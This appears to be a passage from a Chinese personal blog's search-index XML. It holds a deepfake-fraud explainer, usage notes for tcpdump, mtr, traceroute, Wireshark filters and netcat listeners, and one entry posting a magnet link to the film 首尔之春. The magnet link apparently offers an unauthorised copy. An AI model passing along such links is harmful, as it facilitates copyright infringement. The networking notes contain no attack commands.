    <categories>
      
      <category>infomationCocoon</category>
      
      <category>video</category>
      
    </categories>
    
    
    <tags>
      
      <tag>infomationCocoon</tag>
      
      <tag>video</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>movie-首尔之春</title>
    <link href="/2024/12/30/informationCocoon/video/movie-%E9%A6%96%E5%B0%94%E4%B9%8B%E6%98%A5/"/>
    <url>/2024/12/30/informationCocoon/video/movie-%E9%A6%96%E5%B0%94%E4%B9%8B%E6%98%A5/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><p>首尔之春1080P</p><p>magnet:?xt&#x3D;<br>urn:btih:D75064CA251FB9A2E9206DDCBC369225E3D02087 ​​​</p>]]></content>
    
    
    <categories>
      
      <category>infomationCocoon</category>
      
      <category>video</category>
      
    </categories>
    
    
    <tags>
      
      <tag>infomationCocoon</tag>
      
      <tag>video</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>AI 造假术-揭秘这项技术背后的真相</title>
    <link href="/2024/12/30/informationCocoon/tk_article/AI%20%E9%80%A0%E5%81%87%E6%9C%AF-%E6%8F%AD%E7%A7%98%E8%BF%99%E9%A1%B9%E6%8A%80%E6%9C%AF%E8%83%8C%E5%90%8E%E7%9A%84%E7%9C%9F%E7%9B%B8/"/>
    <url>/2024/12/30/informationCocoon/tk_article/AI%20%E9%80%A0%E5%81%87%E6%9C%AF-%E6%8F%AD%E7%A7%98%E8%BF%99%E9%A1%B9%E6%8A%80%E6%9C%AF%E8%83%8C%E5%90%8E%E7%9A%84%E7%9C%9F%E7%9B%B8/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>2024 年 12 月初，网络上出现了一段带货视频，在视频中卖力地推销某食品的居然是国家传染病医学中心主任、复旦大学附属华山医院感染科主任张文宏医生。</p><p>不少网友出于对张文宏医生的信任，不仅自己购买，还积极地把视频转发到家族群。然而，<strong>张文宏医生本人很快对此做出了澄清：该视频非其本人录制，应该是用 AI 伪造的。</strong></p><p><img src="/005ztyuLly4hwtpg9ljp0j608r0brjrm02.jpg" alt="img"></p><p>网络截图</p><p>近年来，随着人工智能技术的迅猛发展，此类 AI 伪造视频事件频频曝光。不法分子利用 AI 技术，假冒名人身份进行诈骗、发布虚假广告，甚至通过伪造视频骗取巨额财产，严重威胁社会信任体系和信息安全。</p><p>今天，我们从技术角度来剖析一下此类事件。</p><p><strong>AI 伪造视频的技术：</strong></p><p><strong>从生存对抗网络到 Deepfake</strong></p><p>这类 AI 伪造视频所用的技术并不是最近才出现的，上世纪九十年代学术界就开始了面部替换和图像生成相关技术的研究。2014 年，伊恩·古德费洛（Ian Goodfellow）提出了生成对抗网络（GAN，Generative Adversarial Network），使得计算机可以生成更为逼真且高质量的图像。</p><p>生成对抗网络由生成器（Generator）和判别器（Discriminator）两部分组成。<strong>生成器创建内容，而判别器则检测所创建的内容是不是真实的，并将结果反馈给生成器。在训练过程中，两者一攻一守，相互对抗，并在对抗中提升各自的能力，最终生成器能够生成非常逼真的画面。</strong></p><p>2017 年，有人在网络社区 Reddit 上创建了一个名为“deepfakes”的账号，并发布了一些用生成对抗网络技术制作的名人换脸视频。从此，“Deepfake”一词开始被广泛使用，通常是指代这类换脸视频所用的技术。</p><p>2018 年 1 月，一款名为 FakeApp 的桌面应用程序发布。紧接着，Faceswap、DeepFaceLab 等具有类似功能的开源工具出现了。这些工具大大降低了 Deepfake 的门槛，使不具备专业知识的普通用户也能轻松生成换脸视频。</p><p><strong>随着相关技术不断进步，今天的 Deepfake 和之前相比，不仅生成的视频分辨率更高、面部表情同步更自然，而且所需的数据更少、训练时间更短。</strong>早期 Deepfake 训练往往需要数百到上千张目标人物的图片或数分钟至数小时的视频，以获取不同角度、不同表情的脸部特征。但随着生成对抗网络技术本身的发展，迁移学习（Transfer Learning）、小样本学习（Few-Shot Learning）等技术的出现，现在仅需要几十张甚至单张照片就可以生成 Deepfake 视频。</p><p><img src="/005ztyuLly4hwtpgaoem5j60u00jzwfv02.jpg" alt="img"></p><p>图库版权图片，转载使用可能引发版权纠纷</p><p>另外，早期 Deepfake 只能生成画面，现在结合声音克隆（Voice Cloning）、语音风格迁移（Voice Style Transfer）等技术，还可以生成以假乱真的目标人物声音，并且可以令视频中的嘴部动作和声音一致。</p><p>简单来说，<strong>现在只需要有一张照片，几秒钟的语音，就可以生成 Deepfake 视频。</strong>当然，如果有更多照片和更长的语音，生成的视频也会更逼真。</p><p><strong>Deepfake 技术的</strong></p><p><strong>正面应用和负面影响</strong></p><p>Deepfake 虽然是“伪造”，但在获得被“伪造”者许可的情况下，可以有很多正面的应用。例如，2019 年，英国足球明星大卫·贝克汉姆发布了一段呼吁消灭疟疾的视频。在视频中，他使用了包括斯瓦希里语和约鲁巴语等在内的 9 种语言。而除了英语之外，其余 8 种语言都是用 Deepfake 技术生成的。</p><p>此外，Deepfake 所使用的各类技术在数字人等领域也有广泛应用，在视频主播、影视制作、教育和培训、心理治疗康复等领域都能发挥积极的作用。</p><p><strong>但任何技术都可能被用在不好的地方。</strong>在前面提到的假张文宏之前，已经出现过假靳东、假马云、假雷军、假于东来等。假冒名人卖货不是最糟糕的，<strong>Deepfake 类技术还被用在很多更恶劣的地方，例如诈骗。</strong></p><p>2024 年 12 月 20 日，BBC 报道了一则《爱情骗子利用 Deepfake 从我这里骗走 1.7 万英镑》的故事。受害人是 77 岁的尼基·麦克劳德（Nikki MacLeod）。骗子告诉她，自己在一座石油钻井平台上工作，并要求 Nikki 购买 Steam 礼品卡以及通过 Paypal 转账等方式提供金钱，以便在钻井平台上获得互联网连接，以及支付到苏格兰来见她的旅行费用。Nikki 最初持怀疑态度，但看到对方发来的钻井平台上的视频后就相信了。</p><p>2024 年 1 月，某香港公司的一名员工从公司账户转了 2500 万美元给诈骗者。骗子以首席财务官的名义和他进行了视频通话，要求他执行这笔转账。在视频通话中，该员工不仅看到了首席财务官“本人”，甚至还看到了其它“同事”。</p><p>据著名会计师事务所德勤 2024 年 5 月发布的一份报告，2023 年美国的 Deepfake 欺诈增加了 700%，造成了 123 亿美元的损失，并且这一数字在 2027 年可能会达到 400 亿美元。</p><p><img src="/005ztyuLly4hwtpgbm424j60u00hcgms02.jpg" alt="img"></p><p>图库版权图片，转载使用可能引发版权纠纷</p><p>除了诈骗之外，Deepfake 技术可以还被用来骗过人脸识别。很多移动应用会使用人脸识别来验证用户身份。为防止用照片假冒人脸，现在的人脸识别技术通常都会进行活体检测，类似 3D 结构光等活体识别技术需要特殊硬件，但只有部分手机支持。</p><p>目前，很多场合使用的还是基于手机前置摄像头的 2D 人脸识别。而 2D 人脸识别的活体检测主要是要求用户做出眨眼、点头等动作，以及用屏幕闪烁特定颜色的光线。于是就有人使用 Deepfake 技术结合一些其它的手段，来骗过人脸识别，从而盗取网络账号。</p><p><strong>如何识别和检测 Deepfake 视频？</strong></p><p><strong>制作不够精良的 Deepfake 视频用肉眼就可看出异常。</strong>例如，人物的面部表情或眼神不自然，眨眼的次数过少，面部边缘模糊，或者与背景的过渡不自然，人脸的光影效果与周围环境的光线情况不符等。但是，随着 Deepfake 技术的进步，这些异常特征也越来越少。</p><p>目前已知的 Deepfake 技术能仿冒人脸做出的表情，但还不能仿冒人脸在受到外部压力时产生的变形。所以，在视频通话时，如果怀疑遭到了 Deepfake 欺诈，可以要求对方用食指按压一侧的鼻翼，或按压一侧的脸颊。</p><p><strong>除了肉眼分辨，用 AI 来识别 AI 生成的内容也是热门的研究方向。</strong>例如合成视频可能在帧与帧之间存在不连续性，进行时序一致性分析就可能发现异常。另外，人的心脏跳动会导致皮肤出现和脉搏节律一致的细微色彩变化，通过这种色彩变化可以获取脉搏信息，而 Deepfake 的视频可能没有这种特征。</p><p>但我们也要意识到，Deepfake 使用的生成式对抗网络技术本来就是由生成器和判别器两部分组成，任何一种检测 Deepfake 的技术手段也都可以纳入到 Deepfake 的判别器中，从而生成该技术难以检测的伪造内容。</p><p><img src="/005ztyuLly4hwtpgca9etj60u00k0dh702.jpg" alt="img"></p><p>图库版权图片，转载使用可能引发版权纠纷</p><p>近年来，我国颁布实施了《互联网信息服务深度合成管理规定》《生成式人工智能服务管理暂行办法》等，但这些法律法规主要约束的是提供相关服务的平台。而随着软硬件技术的发展，目前 Deepfake 完全可以只使用运行在个人电脑中的模型完成。</p><p>所以，<strong>要应对 Deepfake 带来的各类问题，需要全流程的综合治理机制，未来需要技术、平台、法律的多元协同。</strong>用 Deepfake 假冒名人身份，欺骗他人购买产品，不仅可能违反《民法典》第 1019 条和第 1024 条，侵犯他人的肖像权、名誉权，还可能涉及《刑法》第 266 条诈骗罪、《刑法》第 222 条虚假广告罪等。对于使用 Deepfake 涉及违法乃至犯罪的行为，就需要依法进行打击。</p><h1 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h1><p>【1】科普中国  AI 造假术！揭秘这项技术背后的真相 12-22 15:10</p><p><a href="https://weibo.com/ttarticle/x/m/show#/id=2309405114399823364195&_wb_client_=1">https://weibo.com/ttarticle/x/m/show#/id=2309405114399823364195&amp;_wb_client_=1</a></p>]]></content>
    
    
    <categories>
      
      <category>infomationCocoon</category>
      
      <category>tk</category>
      
    </categories>
    
    
    <tags>
      
      <tag>infomationCocoon</tag>
      
      <tag>tk</tag>
      
      <tag>AI</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>tcpdump</title>
    <link href="/2024/12/27/network/networktools/tcpdump/"/>
    <url>/2024/12/27/network/networktools/tcpdump/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><h3 id="i-网卡名"><a href="#i-网卡名" class="headerlink" title="-i 网卡名"></a>-i 网卡名</h3><p>抓取指定网卡数据包</p><p>-i any</p><p>-i eth0</p><h3 id="dst-port-端口号"><a href="#dst-port-端口号" class="headerlink" title="dst port 端口号"></a>dst port 端口号</h3><p>抓取指定目的端口数据包</p><p>dst port 80</p><h3 id="w-文件名-pcap"><a href="#w-文件名-pcap" class="headerlink" title="-w 文件名.pcap"></a>-w 文件名.pcap</h3><p>保存数据包到指定文件</p><p>-w test.pcap</p><h3 id="host-ip"><a href="#host-ip" class="headerlink" title="host ip"></a>host ip</h3><p>抓取与指定IP交互数据包</p><p>host 192.168.1.1</p><h3 id="c-num"><a href="#c-num" class="headerlink" title="-c num"></a>-c num</h3><p>抓取指定数量的数据包</p><h2 id="常见示例"><a href="#常见示例" class="headerlink" title="常见示例"></a>常见示例</h2><h3 id="抓取指定目的端口数据包"><a href="#抓取指定目的端口数据包" class="headerlink" title="抓取指定目的端口数据包"></a>抓取指定目的端口数据包</h3><pre><code class="hljs">tcpdump -i eth0 dst port 80</code></pre><h3 id="抓取与指定主机和指定目的端口交互的数据包"><a href="#抓取与指定主机和指定目的端口交互的数据包" class="headerlink" title="抓取与指定主机和指定目的端口交互的数据包"></a>抓取与指定主机和指定目的端口交互的数据包</h3><pre><code class="hljs">tcpdump -i eth0 host 10.185.16.237 and dst port 80</code></pre><h2 id="备注"><a href="#备注" class="headerlink" title="备注"></a>备注</h2><p>多个条件需要使用 and 连接</p><p>&#x9;host 192.168.1.1 and dst port 80</p>]]></content>
    
    
    <categories>
      
      <category>network</category>
      
      <category>networktools</category>
      
    </categories>
    
    
    <tags>
      
      <tag>network</tag>
      
      <tag>networktools</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ping</title>
    <link href="/2024/12/27/network/networktools/ping/"/>
    <url>/2024/12/27/network/networktools/ping/</url>
    
    <content type="html"><![CDATA[<span id="more"></span>]]></content>
    
    
    <categories>
      
      <category>network</category>
      
      <category>networktools</category>
      
    </categories>
    
    
    <tags>
      
      <tag>network</tag>
      
      <tag>networktools</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>mtr</title>
    <link href="/2024/12/27/network/networktools/mtr/"/>
    <url>/2024/12/27/network/networktools/mtr/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>mtr（My Traceroute）是一款非常有用的网络诊断工具，它结合了 traceroute 和 ping 的功能，可以用来追踪数据包到达目标主机所经过的路径，并同时显示每个跃点（hop）的丢包率和平均往返时间（RTT）。这对于诊断网络问题、了解网络延迟以及定位故障点非常有用。</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h3 id="Debian系统（Ubuntu-Debian）"><a href="#Debian系统（Ubuntu-Debian）" class="headerlink" title="Debian系统（Ubuntu\Debian）"></a>Debian系统（Ubuntu\Debian）</h3><pre><code class="hljs">sudo apt-get updatesudo apt-get install mtr</code></pre><h3 id="x20-Red-Hat系统（Fedora-CentOS-RHEL）"><a href="#x20-Red-Hat系统（Fedora-CentOS-RHEL）" class="headerlink" title="&#x20;Red Hat系统（Fedora, CentOS, RHEL）"></a>&#x20;Red Hat系统（Fedora, CentOS, RHEL）</h3><pre><code class="hljs">sudo dnf install mtrsudo yum install mtr</code></pre><h3 id="Mac系统"><a href="#Mac系统" class="headerlink" title="Mac系统"></a>Mac系统</h3><pre><code class="hljs">brew install mtr</code></pre><h3 id="安装验证"><a href="#安装验证" class="headerlink" title="安装验证"></a>安装验证</h3><pre><code class="hljs">mtr -c 5 8.8.8.8110.local (10.222.28.6) -&gt; 8.8.8.8 (8.8.8.8)                                         2024-07-30T14:55:57+0800Keys:  Help   Display mode   Restart statistics   Order of fields   quit                                                                     Packets               Pings Host                                                              Loss%   Snt   Last   Avg  Best  Wrst StDev 1. 10.222.28.254                                                   0.0%     3    5.9   8.7   5.9  12.9   3.7 2. 10.234.253.18                                                   0.0%     3    6.5   6.4   6.0   6.8   0.4 3. 10.234.253.109                                                  0.0%     3    8.9 111.4   8.9 316.5 177.6 4. 61.135.152.129                                                  0.0%     3    9.7  88.7   9.7 244.9 135.3 5. 192.168.255.5                                                  33.3%     3    9.6  10.0   9.6  10.4   0.6 6. 123.125.248.73                                                  0.0%     3   11.6  56.8  11.5 147.3  78.3 7. 221.216.106.109                                                66.7%     3    9.5   9.5   9.5   9.5   0.0 8. 202.96.12.53                                                   50.0%     3   11.4  11.4  11.4  11.4   0.0 9. 219.158.108.242                                                66.7%     3   47.7  47.7  47.7  47.7   0.010. 219.158.8.118                                                   0.0%     3   54.9  51.8  49.3  54.9   2.811. 219.158.103.26                                                  0.0%     3   54.4  53.3  50.9  54.5   2.012. 219.158.6.66                                                    0.0%     3   61.4  59.3  58.1  61.4   1.813. (waiting for reply)14. 162.245.124.254                                                 0.0%     2   60.0  61.6  60.0  63.2   2.315. ae-25.a00.chwahk03.hk.bb.gin.ntt.net                            0.0%     2   80.3  81.8  80.3  83.2   2.116. 203.131.250.82                                                  0.0%     2   52.2  52.9  52.2  53.6   1.017. 142.250.60.155                                                  0.0%     2   53.3  53.8  53.3  54.4   0.818. 108.170.232.111                                                 0.0%     2   51.6  53.1  51.6  54.7   2.219. dns.google         </code></pre><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><h3 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h3><pre><code class="hljs">mtr [options] hostname_or_ip</code></pre><p>hostname_or_ip 要追踪的目标主机的域名或 IP 地址</p><h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><h4 id="c-num-x20"><a href="#c-num-x20" class="headerlink" title="-c num&#x20;"></a>-c num&#x20;</h4><p>限制每个跃点的测试次数。默认情况下，mtr 会持续运行，直到手动停止。</p><h4 id="r-x20"><a href="#r-x20" class="headerlink" title="-r&#x20;"></a>-r&#x20;</h4><p>随机DNS解析结果，防止DNS污染</p><h4 id="w"><a href="#w" class="headerlink" title="-w"></a>-w</h4><p>宽屏幕模式</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><br><span class="hljs-attribute">HOST</span>: aliyun-<span class="hljs-number">39</span>_106_2_51                   Loss%   Snt   Last   Avg  Best  Wrst StDev<br>  <span class="hljs-attribute">1</span>.|-- <span class="hljs-number">10.36.72.158</span>                         <span class="hljs-number">25</span>.<span class="hljs-number">0</span>%    <span class="hljs-number">20</span>    <span class="hljs-number">1</span>.<span class="hljs-number">9</span>   <span class="hljs-number">2</span>.<span class="hljs-number">0</span>   <span class="hljs-number">1</span>.<span class="hljs-number">9</span>   <span class="hljs-number">2</span>.<span class="hljs-number">2</span>   <span class="hljs-number">0</span>.<span class="hljs-number">0</span><br>  <span class="hljs-attribute">2</span>.|-- <span class="hljs-number">11.73.7.186</span>                          <span class="hljs-number">75</span>.<span class="hljs-number">0</span>%    <span class="hljs-number">20</span>    <span class="hljs-number">2</span>.<span class="hljs-number">2</span>   <span class="hljs-number">2</span>.<span class="hljs-number">4</span>   <span class="hljs-number">2</span>.<span class="hljs-number">2</span>   <span class="hljs-number">2</span>.<span class="hljs-number">8</span>   <span class="hljs-number">0</span>.<span class="hljs-number">0</span><br>  <span class="hljs-attribute">3</span>.|-- <span class="hljs-number">10.102.252.34</span>                         <span class="hljs-number">0</span>.<span class="hljs-number">0</span>%    <span class="hljs-number">20</span>   <span class="hljs-number">15</span>.<span class="hljs-number">2</span>   <span class="hljs-number">2</span>.<span class="hljs-number">6</span>   <span class="hljs-number">1</span>.<span class="hljs-number">9</span>  <span class="hljs-number">15</span>.<span class="hljs-number">2</span>   <span class="hljs-number">3</span>.<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h3 id="结果解读"><a href="#结果解读" class="headerlink" title="结果解读"></a>结果解读</h3><pre><code class="hljs">Loss%：丢包百分比Snt：发送的数据包总数Last：最后一次测试的往返时间（RTT）Avg：平均往返时间（RTT）Best：最佳往返时间（RTT）Wrst：最差往返时间（RTT）IP address：跃点的 IP 地址</code></pre>]]></content>
    
    
    <categories>
      
      <category>network</category>
      
      <category>networktools</category>
      
    </categories>
    
    
    <tags>
      
      <tag>network</tag>
      
      <tag>networktools</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>traceroute</title>
    <link href="/2024/12/27/network/networktools/traceroute/"/>
    <url>/2024/12/27/network/networktools/traceroute/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="traceroute原理"><a href="#traceroute原理" class="headerlink" title="traceroute原理"></a>traceroute原理</h1><p>traceroute是一个网络诊断工具，主要用于跟踪 IP 数据包从源主机到目标主机所经过的路径。它通过发送一系列具有不同生存时间（TTL）值的 UDP 数据包（在某些情况下也可以是 ICMP 数据包）来实现路径追踪。</p><p>当一个数据包的 TTL 值减为 0 时，它会被当前路由器丢弃，并返回一个 ICMP “Time - Exceeded” 消息给源主机。通过分析这些返回的消息，<code>traceroute</code>就可以确定数据包经过的每个路由器的 IP 地址。</p><h1 id="traceroute命令及语法"><a href="#traceroute命令及语法" class="headerlink" title="traceroute命令及语法"></a>traceroute命令及语法</h1><h2 id="命令语法"><a href="#命令语法" class="headerlink" title="命令语法"></a>命令语法</h2><p>traceroute [选项] 目标主机名或目标IP</p><h2 id="选项"><a href="#选项" class="headerlink" title="选项"></a>选项</h2><h3 id="n"><a href="#n" class="headerlink" title="-n"></a>-n</h3><p>以数字形式显示IP地址，而不去进行DNS反查</p><h3 id="I（大写i）"><a href="#I（大写i）" class="headerlink" title="-I（大写i）"></a>-I（大写i）</h3><p>使用ICMP Echo请求代替UDP数据包进行探测，因为有些网络会限制UDP数据包</p><h3 id="m-NUM"><a href="#m-NUM" class="headerlink" title="-m NUM"></a>-m NUM</h3><p>设置最大跳数，即数据包最多经过的路由器数量。如果超过这个跳数还没有到达目标主机，traceroute 就会停止。例如，traceroute -m 10 8.8.8.8，表示最多追踪 10 个路由器。</p><h2 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h2><h3 id="初始阶段"><a href="#初始阶段" class="headerlink" title="初始阶段"></a>初始阶段</h3><p>traceroute发送第一个 UDP 数据包，其 TTL 值设置为 1。这个数据包到达路径上的第一个路由器后，TTL 值减为 0，路由器会返回一个 ICMP “Time - Exceeded” 消息给源主机。traceroute记录下这个路由器的 IP 地址，这就是路径中的第一跳。</p><h3 id="迭代过程"><a href="#迭代过程" class="headerlink" title="迭代过程"></a>迭代过程</h3><p>traceroute发送第二个 UDP 数据包，TTL 值设置为 2。这个数据包会经过第一个路由器（TTL 减为 1），然后到达第二个路由器（TTL 减为 0），第二个路由器返回 ICMP “Time - Exceeded” 消息，记录第二个路由器的 IP 地址，即第二跳。这个过程不断重复，每次增加 TTL 值，直到数据包到达目标主机或者达到设置的最大跳数。</p><h3 id="到达目标主机"><a href="#到达目标主机" class="headerlink" title="到达目标主机"></a>到达目标主机</h3><p>当 UDP 数据包最终到达目标主机时，目标主机可能会返回一个 ICMP “Port Unreachable” 消息（因为默认情况下traceroute使用的 UDP 端口可能没有在目标主机上打开），这表示已经成功追踪到目标主机。traceroute会记录下整个路径上的所有路由器的 IP 地址和相应的往返时间（RTT）。</p>]]></content>
    
    
    <categories>
      
      <category>network</category>
      
      <category>networktools</category>
      
    </categories>
    
    
    <tags>
      
      <tag>network</tag>
      
      <tag>networktools</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pathping</title>
    <link href="/2024/12/27/network/networktools/pathping/"/>
    <url>/2024/12/27/network/networktools/pathping/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><p>Windows系统中命令</p>]]></content>
    
    
    <categories>
      
      <category>network</category>
      
      <category>networktools</category>
      
    </categories>
    
    
    <tags>
      
      <tag>network</tag>
      
      <tag>networktools</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>wireshark</title>
    <link href="/2024/12/27/network/networktools/wireshark/"/>
    <url>/2024/12/27/network/networktools/wireshark/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h1><h2 id="过滤ACK报文"><a href="#过滤ACK报文" class="headerlink" title="过滤ACK报文"></a>过滤ACK报文</h2><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">tcp.flags.ack <span class="hljs-operator">=</span><span class="hljs-operator">=</span> <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h2 id="过滤指定IP报文"><a href="#过滤指定IP报文" class="headerlink" title="过滤指定IP报文"></a>过滤指定IP报文</h2><p>显示所有目的ip或者来源ip为10.13.8.75的数据包</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">ip.addr <span class="hljs-operator">=</span><span class="hljs-operator">=</span> <span class="hljs-number">10.13</span>.<span class="hljs-number">8.75</span><br></code></pre></td></tr></table></figure><h2 id="过滤指定端口"><a href="#过滤指定端口" class="headerlink" title="过滤指定端口"></a>过滤指定端口</h2><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">udp.port <span class="hljs-operator">=</span><span class="hljs-operator">=</span> <span class="hljs-number">1900</span> <br></code></pre></td></tr></table></figure><p>显示所有目的端口和来源端口为1900端口的UDP的数据包</p><h2 id="过滤DNS报文"><a href="#过滤DNS报文" class="headerlink" title="过滤DNS报文"></a>过滤DNS报文</h2><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">dns</span><br></code></pre></td></tr></table></figure><h2 id="过滤查询指定域名的DNS-Query"><a href="#过滤查询指定域名的DNS-Query" class="headerlink" title="过滤查询指定域名的DNS Query"></a>过滤查询指定域名的DNS Query</h2><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">dns.qry.name <span class="hljs-operator">=</span><span class="hljs-operator">=</span> <span class="hljs-string">&quot;www.xiaohongshu.com&quot;</span><br></code></pre></td></tr></table></figure><h2 id="过滤特定-DNS-记录类型"><a href="#过滤特定-DNS-记录类型" class="headerlink" title="过滤特定 DNS 记录类型"></a>过滤特定 DNS 记录类型</h2><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs abnf">dns.qry.type <span class="hljs-operator">=</span><span class="hljs-operator">=</span> <span class="hljs-string">&quot;A&quot;</span><br>dns.qry.type <span class="hljs-operator">=</span><span class="hljs-operator">=</span> <span class="hljs-string">&quot;AAAA&quot;</span><br>dns.qry.type <span class="hljs-operator">=</span><span class="hljs-operator">=</span> <span class="hljs-string">&quot;NS&quot;</span><br>dns.qry.type <span class="hljs-operator">=</span><span class="hljs-operator">=</span> <span class="hljs-string">&quot;TXT&quot;</span><br>dns.qry.type <span class="hljs-operator">=</span><span class="hljs-operator">=</span> <span class="hljs-string">&quot;MX&quot;</span><br></code></pre></td></tr></table></figure><h2 id="过滤多种协议报文-or"><a href="#过滤多种协议报文-or" class="headerlink" title="过滤多种协议报文 or"></a>过滤多种协议报文 or</h2><p>可以使用 or 关键字连接</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">udp or icmp</span><br></code></pre></td></tr></table></figure><h2 id="多个过滤条件拼接-or-and"><a href="#多个过滤条件拼接-or-and" class="headerlink" title="多个过滤条件拼接 or and"></a>多个过滤条件拼接 or and</h2><p>可以使用 or 、and关键字连接</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">udp or dns</span><br></code></pre></td></tr></table></figure><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">udp</span> <span class="hljs-keyword">and</span> dns<br></code></pre></td></tr></table></figure><h2 id="过滤-Client-Hello-数据包指定SNI（server-name）"><a href="#过滤-Client-Hello-数据包指定SNI（server-name）" class="headerlink" title="过滤 Client Hello 数据包指定SNI（server name）"></a>过滤 Client Hello 数据包指定SNI（server name）</h2><p>tls.handshake.type &#x3D;&#x3D; 1 过滤出 Client Hello 数据包（TLS握手类型为1）</p><p><img src="/image-20250208110709884.png" alt="image-20250208110709884"></p><p>tls.handshake.extension.type &#x3D;&#x3D; “server_name”  过滤出包含 Server Name Indication（SNI）扩展的数据包</p><p><img src="/image-20250208110832657.png" alt="image-20250208110832657"></p><p>精确匹配 &#x3D;&#x3D; </p><p>tls.handshake.extensions_server_name &#x3D;&#x3D; “具体域名” 过滤出 Server Name 字段为具体域名的数据包</p><p><img src="/image-20250208111230867.png" alt="image-20250208111230867"></p><p>模糊匹配 contains</p><p>如果需要模糊匹配域名，可以使用contains关键字匹配</p><p>tls.handshake.extensions_server_name contanins “关键字”  过滤出 Server Name 字段模糊匹配到关键字的数据包</p><p><img src="/image-20250208111857016.png" alt="image-20250208111857016"></p>]]></content>
    
    
    <categories>
      
      <category>network</category>
      
      <category>networktools</category>
      
    </categories>
    
    
    <tags>
      
      <tag>network</tag>
      
      <tag>networktools</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>netcat</title>
    <link href="/2024/12/27/network/networktools/netcat/"/>
    <url>/2024/12/27/network/networktools/netcat/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h3 id="debain系统"><a href="#debain系统" class="headerlink" title="debain系统"></a>debain系统</h3><pre><code class="hljs">sudo apt-get install nmap</code></pre><h3 id="Red-Hat系统"><a href="#Red-Hat系统" class="headerlink" title="Red Hat系统"></a>Red Hat系统</h3><pre><code class="hljs">sudo yum install nmap-ncatsudo dnf install nmap-ncat</code></pre><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><h3 id="l-–listen"><a href="#l-–listen" class="headerlink" title="-l –listen"></a>-l –listen</h3><p>开启监听，也就是处于监听端口的状态，并不会对外发起连接</p><h3 id="u-–udp"><a href="#u-–udp" class="headerlink" title="-u –udp"></a>-u –udp</h3><p>监听UDP协议端口，默认监听TCP协议</p><h3 id="p-–source-port-端口号"><a href="#p-–source-port-端口号" class="headerlink" title="-p –source-port 端口号"></a>-p –source-port 端口号</h3><p>指定源端口，也就是本地监听端口号</p><h3 id="v-–verbose-x20"><a href="#v-–verbose-x20" class="headerlink" title="-v –verbose&#x20;"></a>-v –verbose&#x20;</h3><p>Set verbosity level (can be used several times)</p><p>显示执行过程</p><pre><code class="hljs">[root@nvm-14yhwwkhnu5v0 ~]# ncat -lvp 443Ncat: Version 7.50 ( https://nmap.org/ncat )Ncat: Listening on :::443Ncat: Listening on 0.0.0.0:443^C[root@nvm-14yhwwkhnu5v0 ~]# ncat -lp 443</code></pre><h3 id="k-–keep-open"><a href="#k-–keep-open" class="headerlink" title="-k –keep-open"></a>-k –keep-open</h3><p>Accept multiple connections in listen mode</p><p>可以接受多个连接</p><p>默认是单线程的，只允许有单个连接</p><pre><code class="hljs">1、监听单线程443[root@nvm-14yhwwkhnu5v0 ~]# ncat -lvp 443Ncat: Version 7.50 ( https://nmap.org/ncat )Ncat: Listening on :::443Ncat: Listening on 0.0.0.0:443第一个连接➜  ~ telnet 10.2.2.63 443Trying 10.2.2.63...Connected to 10.2.2.63.Escape character is &#39;^]&#39;.第二个连接➜  /tmp telnet 10.2.2.63 443Trying 10.2.2.63...telnet: connect to address 